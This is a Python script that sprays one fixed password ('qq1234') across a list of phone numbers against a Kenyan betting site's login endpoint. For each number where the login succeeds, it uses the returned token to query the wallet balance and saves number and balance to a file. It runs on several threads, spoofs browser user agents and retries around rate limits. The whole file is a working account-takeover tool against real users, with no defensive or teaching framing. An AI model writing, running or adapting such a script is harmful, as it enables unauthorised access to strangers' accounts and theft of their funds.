import concurrent.futures
import os
import threading
import time
import requests

# Execution Configuration
CONNECTIONS = 5  # Increased slightly to demonstrate multi-threading performance
MAX_RETRIES = 10
TIMEOUT = 10

BASE_DIR = r"C:\Users\Root\PycharmProjects\GoogleDeepmindlabs"

INPUT_FILE = os.path.join(BASE_DIR, "testlist.txt")
SUCCESS_FILE = os.path.join(BASE_DIR, "successbalance15.txt")
ERROR_FILE = os.path.join(BASE_DIR, "errorlistbalance2.txt")
TOOMANY_FILE = os.path.join(BASE_DIR, "toomanybalance.txt")
PENDING_FILE = os.path.join(BASE_DIR, "pendingbalance2.txt")
DUPLICATES_FILE = os.path.join(BASE_DIR, "duplicates.txt")

# Threading state structures
retry_counts = {}
retry_items_next_round = set()
io_lock = threading.Lock()


def load_file(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def clear_file(filename):
    with open(filename, "w", encoding="utf-8"):
        pass


def append_line_safely(filename, text):
    """Thread-safe file writing prevents race-conditions."""
    with io_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(text + "\n")


def write_pending(items):
    with open(PENDING_FILE, "w", encoding="utf-8") as f:
        for item in sorted(items):
            f.write(item + "\n")


def process_duplicates(items):
    seen = set()
    duplicates = set()
    for item in items:
        if item in seen:
            duplicates.add(item)
        else:
            seen.add(item)

    if duplicates:
        with open(DUPLICATES_FILE, "w", encoding="utf-8") as f:
            for item in sorted(duplicates):
                f.write(item + "\n")
        print(f"Found and exported {len(duplicates)} duplicates.")


def get_initial_processed_items():
    """Only read disk data once at cold-start to identify historical progress."""
    processed = set()
    for filename in [SUCCESS_FILE, ERROR_FILE]:
        if not os.path.exists(filename):
            continue
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if " Balance:" in line:
                    processed.add(line.split(" Balance:")[0])
                else:
                    processed.add(line)
    return processed


def mark_toomany(dt):
    """Handles incrementation tracks and segregates data securely."""
    with io_lock:
        retry_counts[dt] = retry_counts.get(dt, 0) + 1
        if retry_counts[dt] >= MAX_RETRIES:
            print(f"Max retries reached for {dt}. Moving to error list.")
            append_line_safely(ERROR_FILE, dt)
        else:
            retry_items_next_round.add(dt)
            append_line_safely(TOOMANY_FILE, dt)


def check_balance(session, dt):
    lt = dt[-2:]
    kc = dt[-4]
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1{lt}.0.{kc}.90 Safari/537.36"

    """Executes network transactions per target."""
    login_url = "https://identity.imarabet.co.ke:443/login?lang=en&country_code=ke"
    headers = {
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://imarabet.co.ke",
        "Referer": "https://imarabet.co.ke/",
        "User-Agent": user_agent,
    }

    payload = {
        "btag": "",
        "campaign": "",
        "click_id": "",
        "code": "",
        "country_code": "",
        "fbclid": "",
        "gclid": "",
        "medium": "",
        "msisdn": int(dt),
        "password": "qq1234",
        "referrer": "",
        "source": "",
    }

    try:
        resp = session.post(
            login_url, headers=headers, json=payload, timeout=TIMEOUT
        )
        qq = resp.json()
        cc = qq.get("auth")
        fg = qq.get("error_code")

        if cc:
            burp0_url1 = "https://wallet.imarabet.co.ke:443/balance"
            burp0_headers1 = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Api-Key": cc, "Accept-Language": "en-US,en;q=0.9", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "*/*", "Origin": "https://imarabet.co.ke", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://imarabet.co.ke/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}
            resp1=requests.get(burp0_url1, headers=burp0_headers1)
            mm = resp1.json()          

            if mm.get("error_code"):
                mark_toomany(dt)
                time.sleep(20)  # Soft sleep window on specific hit limiters
            else:
                bl = mm.get("b2")
                append_line_safely(SUCCESS_FILE, f"{dt} Balance: {bl}")
            return True

        if fg:
            append_line_safely(ERROR_FILE, dt)
            time.sleep(20)
        else:
            mark_toomany(dt)
        return True

    except (requests.RequestException, ValueError) as e:
        print(f"Network/Parsing Error for {dt}: {e}")
        mark_toomany(dt)
        return False
    except Exception as e:
        print(f"Unexpected runtime failure for {dt}: {e}")
        mark_toomany(dt)
        return False


def process_batch(items):
    """Processes items concurrently utilizing a shared connection session pool."""
    # Shared persistent session pool across the execution batch threads
    with requests.Session() as session:
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=CONNECTIONS
        ) as executor:
            future_to_item = {
                executor.submit(check_balance, session, item): item
                for item in items
            }
            total = len(future_to_item)

            for count, future in enumerate(
                concurrent.futures.as_completed(future_to_item), start=1
            ):
                item = future_to_item[future]
                try:
                    future.result()
                    print(f"[{count}/{total}] Finished: {item}")
                except Exception as e:
                    print(f"[{count}/{total}] Thread Crash: {item} -> {e}")


def main():
    global retry_items_next_round
    clear_file(PENDING_FILE)
    clear_file(TOOMANY_FILE)

    print("Loading input configurations...")
    all_items = load_file(INPUT_FILE)
    if not all_items:
        print("Input file source empty.")
        return

    process_duplicates(all_items)
    original_items = set(all_items)

    # In-memory session state initialization reduces high disk overhead tracking
    processed_cache = get_initial_processed_items()
    current_batch = original_items - processed_cache

    round_number = 1

    while current_batch:
        print(
            f"\n{'='*20} ROUND {round_number} (Target Queue: {len(current_batch)}) {'='*20}"
        )

        write_pending(current_batch)

        # Clear standard temporary staging variables ahead of loop execution run
        retry_items_next_round.clear()
        clear_file(TOOMANY_FILE)

        process_batch(current_batch)

        # Sync caches seamlessly without reloading entire raw data files from disk
        freshly_processed = get_initial_processed_items()
        processed_cache.update(freshly_processed)

        if retry_items_next_round:
            current_batch = set(retry_items_next_round)
            round_number += 1
            print(
                f"\nCooldown: {len(current_batch)} requests deferred to next cycle loop..."
            )
            time.sleep(5)
        else:
            # Fallback evaluation checkpoint verification
            unfinished = original_items - processed_cache
            if unfinished:
                current_batch = unfinished
                round_number += 1
                continue
            break

    print("\nAll batch cycles successfully completed.")
    clear_file(PENDING_FILE)
    clear_file(TOOMANY_FILE)


if __name__ == "__main__":
    main()